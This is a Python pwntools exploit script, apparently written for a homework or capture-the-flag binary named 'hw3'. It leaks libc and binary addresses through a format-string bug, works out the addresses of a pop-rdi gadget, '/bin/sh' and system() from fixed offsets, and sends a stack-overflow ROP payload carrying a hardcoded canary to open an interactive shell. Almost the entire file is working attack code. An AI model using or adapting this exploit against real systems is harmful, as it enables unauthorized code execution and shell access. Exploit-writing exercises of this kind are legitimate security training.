#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap
from struct import pack


def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])

binPath="./hw3"
isRemote = pwn.args.REMOTE
# build in GDB support
gdbscript = '''
init-pwndbg
break *order +90
continue
'''.format(**locals())


pwn.context.log_level="info"
io = start()
overflow = b'A'*72
canary=pwn.p64(0xf007ba11f007ba11) 
nops=b'\x90'*8

io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%23$p")
leakedaddr=io.recvline()
                                  
io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%28$p")
tableaddr=io.recvline()
#0x7ffff7dfb7fd (__libc_start_main+205)
#0x555555555410 (__libc_csu_init)
strippedaddr1=leakedaddr.strip().decode("utf-8")
strippedaddr2=tableaddr.strip().decode("utf-8")

binsh_addr_str=strippedaddr1[13:]
libc_addr_str=strippedaddr2[13:]
arg1=int(binsh_addr_str, 16)
arg2=int(libc_addr_str, 16)

poprdi =   arg2 + int(91)
binsh  =  arg1 + 1511557
libcsystem = arg1 + 139363



io.sendline("1")
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

#libcbase = 0x00007ffff7dcf000
#poprdi = pwn.p64(0x000055555555546b)
#libcsystem = pwn.p64(0x7ffff7e1d860)
#binsh = pwn.p64(0x7ffff7f6c882)
payload = pwn.flat(
        [
            overflow,
            canary,
            nops,
  	    poprdi,
  	    binsh,
  	    libcsystem
            ]
        )
pwn.info("Payload len: %d",len(payload))
io.sendline(payload)

io.interactive()
